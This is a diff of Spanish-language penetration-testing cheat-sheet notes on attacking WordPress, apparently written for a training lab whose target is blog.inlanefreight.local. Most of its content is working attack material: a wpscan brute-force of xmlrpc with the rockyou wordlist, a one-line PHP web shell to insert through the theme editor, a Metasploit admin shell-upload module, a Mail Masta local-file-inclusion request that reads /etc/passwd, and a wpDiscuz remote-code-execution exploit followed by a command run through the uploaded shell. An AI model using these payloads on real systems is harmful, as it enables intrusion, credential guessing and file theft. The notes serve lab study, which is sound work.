@@ -12,7 +12,6 @@ curl -s http://<dominio> | grep plugins
 #De esta forma, podemos buscar los plugins. Ver seccion de mas abajo al respecto
 
 	### Enumeration
-
 El login (wp-login.php) por default tiene mensajes distintos tanto para un usuario o contraseña incorrecta.
 searchsploit wordpress user enumeration
 #Nos muestra un script en php para enumerar usuarios
@@ -46,9 +45,19 @@ wp-config.php
 
 	## Attacking
 sudo wpscan --password-attack xmlrpc -t 20 -U <usuario> -P /usr/share/wordlists/rockyou.txt --url http://<url>
-#Bruteforce con wpscan
+#Bruteforce con wpscan a xmlrpc
 system($_GET[0]);
 #Con acceso administrativo podemos modificar el codigo PHP para ejecutar comandos en wp-admin/theme-editor.php?file=404.php&theme=twentynineteen
 use exploit/unix/webapp/wp_admin_shell_upload 
 #Modulo de Metasploit que permite subir una web shell y ejecutarla automaticamente mediante un usuario y contraseña de admin
 
+	## known plugin vulns: Mail masta
+curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+#Plugin deprecated sin soporte que sigue en uso en algunas paginas. Permite LFI
+
+	## known plugin vulns: wpDiscuz
+python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
+#Este plugin en v7.0.4 tiene una vulnerabilidad para rce
+https://www.exploit-db.com/exploits/49967
+curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
+#Con esto (modificando el path) obtenemos el rce
